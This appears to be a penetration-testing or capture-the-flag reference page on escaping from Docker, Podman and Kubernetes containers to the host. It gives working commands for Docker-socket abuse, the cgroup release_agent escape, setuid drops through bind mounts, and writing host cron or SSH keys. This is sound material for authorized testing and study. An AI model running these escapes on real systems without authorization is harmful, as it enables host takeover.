# Container escape

You have a shell (often root) *inside* a container and want the host. The escape
is almost always a misconfiguration handed to the container, not a kernel 0-day.
Fingerprint the situation first, then pick the matching primitive.

## Am I in a container, and how loose is it?

```bash
cat /.dockerenv 2>/dev/null; cat /run/.containerenv 2>/dev/null   # docker / podman
cat /proc/1/cgroup | grep -iE 'docker|lxc|kube'
capsh --print 2>/dev/null | grep Current                          # what caps I hold
cat /proc/self/status | grep CapEff                               # raw effective caps
mount | grep -iE 'docker.sock|host|/mnt|overlay'                  # mounted host bits
ls -la /var/run/docker.sock /run/docker.sock 2>/dev/null
env | grep -iE 'KUBERNETES|SECRET|TOKEN'
```

Decode `CapEff` with `capsh --decode=<hex>`. `0000003fffffffff` (or any value
with `cap_sys_admin`) = wildly over-privileged, likely `--privileged`.

## Mounted docker/podman socket — the easiest win

If `/var/run/docker.sock` is reachable, you *are* the Docker daemon: launch a new
container that mounts the host root and chroot into it.

```bash
# with the docker client
docker -H unix:///var/run/docker.sock run -v /:/host -it --privileged alpine chroot /host sh
# raw HTTP if no client binary
curl -s --unix-socket /var/run/docker.sock http://x/containers/json      # confirm access
```
Same idea for a mounted `containerd.sock`/`crictl` or a Podman socket. Then read
`/host/root/root.txt`, drop an SSH key, or `chroot` for a full host shell.

## `--privileged` (or CAP_SYS_ADMIN) — cgroup release_agent

A privileged container can write the cgroup `release_agent`, which the host runs
as root when the last process leaves the cgroup:

```bash
mkdir -p /tmp/c && mount -t cgroup -o rdma cgroup /tmp/c 2>/dev/null || \
  mount -t cgroup -o memory cgroup /tmp/c
mkdir -p /tmp/c/x && echo 1 > /tmp/c/x/notify_on_release
host=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)   # host path of upperdir
echo "$host/cmd" > /tmp/c/release_agent
printf '#!/bin/sh\nid > %s/out\n' "$host" > /cmd; chmod +x /cmd
sh -c "echo \$\$ > /tmp/c/x/cgroup.procs"     # trigger; read $host/out on the host
```
On cgroup v2 hosts the release_agent trick differs — if it's v2, prefer the
device or host-mount routes below.

## Host filesystem / sensitive mounts

`mount` showed `/`, `/etc`, or a host path mounted in? Write directly:
`authorized_keys` into a host user, a cron into `/etc/cron.d`, or read
`/etc/shadow`. A mounted host `/proc` or `/dev` (privileged) lets you reach host
memory or raw disk (`debugfs /dev/sda1`).

**Writable bind mount + no userns-remap = a root-write primitive on the host,
even from an unprivileged container.** Docker without `userns-remap` maps
container uid 0 straight to host uid 0, so any file *container-root* creates on a
read-write bind mount is `root:root` on the host. You often already have
container-root: a service account with passworded `sudo` inside the container is
enough (get the password from the app config or `env`). Turn the write into host
code-exec by the cheapest route the host allows:

- **setuid drop** — copy a shell onto the mount, `chown root:root`, `chmod 4755`;
  run it from the host as any user (`/mount/path/.x -p`). Works only if the host
  partition holding the mount is **not `nosuid`** — check `findmnt -no OPTIONS -T
  <mount>` first; `/tmp`-style `nosuid` makes the setuid bit inert (see
  privesc-linux).
- if `nosuid`, write into a path the mount overlaps that root *executes* instead
  (a cron script, an `authorized_keys`, a systemd unit) rather than a setuid file.

Confirm the mapping before trusting it: `sudo touch /mount/x` in the container,
then check the owner on the host — `root:root` means no remap and the escape is live.

## Capability-specific routes

- **CAP_SYS_ADMIN** — mount, cgroup escapes, and mounting host block devices.
- **CAP_SYS_PTRACE + host PID ns** (`--pid=host`) — inject shellcode into a host
  process.
- **CAP_SYS_MODULE** — `insmod` a malicious kernel module → ring-0 on the host.
- **CAP_DAC_READ_SEARCH** — `shocker`/`open_by_handle_at` to read arbitrary host
  files by inode brute-force.
- **Device access to the host disk** (`ls -la /dev/sd*`, `/dev/mapper`) — mount
  it read-write and write into the host FS.

## Kubernetes-flavoured containers

A mounted service-account token (`/var/run/secrets/kubernetes.io/...`) is not a
host escape by itself — it's a cluster credential. Enumerate its RBAC and go for
`nodes/proxy`, a privileged pod, or a hostPath mount. See
`references/kubernetes.md`.

## After escaping

Verify you're on the host, not another container (`hostname`, `mount`, the
absence of `/.dockerenv`). Record the exact primitive and the file that proved
the loose config (the `mount` line, the `CapEff` value) in FINDINGS.md, and clean
up any container/file you created on the host.
